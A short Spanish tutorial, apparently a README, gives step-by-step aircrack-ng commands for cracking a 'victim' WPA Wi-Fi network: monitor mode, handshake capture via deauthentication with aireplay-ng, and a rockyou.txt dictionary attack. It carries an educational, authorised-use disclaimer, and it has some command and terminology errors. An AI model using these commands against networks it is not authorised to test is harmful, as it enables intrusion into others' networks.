
> [!NOTE] ⚠️ **Aviso**  
La información descrita a continuación se estudia con fines educativos para comprender cómo funcionan las auditorías de redes inalámbricas y así poder **prevenir ataques y mejorar la seguridad**.  
Estas técnicas solo deben aplicarse en redes propias o con autorización expresa.


1.- Descargar o wordlist desde rockyou.txt

2.- Instalar aircrack-ng
  
3.- Ubicar el nombre de la red wifi que queremos testear, ubicar el nombre del adaptador wifi del dispositivo, comando (ifconfig)
  
4.- Crear antena en modo monitoreo, comando (airmon-ng start “nombre red”)
Este comando creará una antena con el mismo nombre que el adaptador pero incluyendo 0mon.

5.- Enumerar las redes wifi cercanas, comando (airodump-ng “nombre adaptador 0mon”)

6.- Escoger la red víctima, copiar el BSSID y tener en cuenta en el que viaja el router víctima. xx:xx:xx:xx:xx:xx y CH

Para ello ejecutaremos el comando siguiente teniendo en cuenta el BSSID y el canal por el que viaja la señal del router víctima.


airodump-ng -c 12 –bssid xx:xx:xx:xx:xx:xx -w fichero.txt “adaptador 0mon”

El comando anterior deja en escucha el adaptador de red 0mon para generar el registro del tráfico (fichero.txt) que está pasando por la red víctima. Dejamos en escucha y abrimos un terminal nuevo el el siguiente comando:

aireplay-ng -0 9 -a xx:xx:xx:xx:xx:xx -c xx:xx:xx:xx:xx:xx “adaptador 0mon”

  
El primer BBSID es el WPA handshake 

El segundo BSSID es el de STATION


Con este comando intentamos suplantar ese handshake para poder falsificar la entrada hasta que podamos establecer conexión, este comando se deberá ejecutar las veces necesarias hasta conectar. 

aircrack-ng -b xx:xx:xx:xx:xx:xx -w rockyou.txt auditoria01.cap

  
El primer BSSID es el WPA handshake

Con este comando esperaremos a forzar la contraseña con las contraseñas generadas del “rockyou.txt” junto con el tráfico interceptado “auditoria01.cap” para poder colarnos en la red wifi.


Este comando dejaremos que esté ejecutado aprox 30min, si no consigue la contraseña tendremos que ejecutar de nuevo el comando y así sucesivamente hasta lograr crackear la contraseña del router víctima.


7.- Desconectamos la red que estamos usando en modo monitoreo con el siguiente comando: airmon-ng stop “adaptador 0mon”
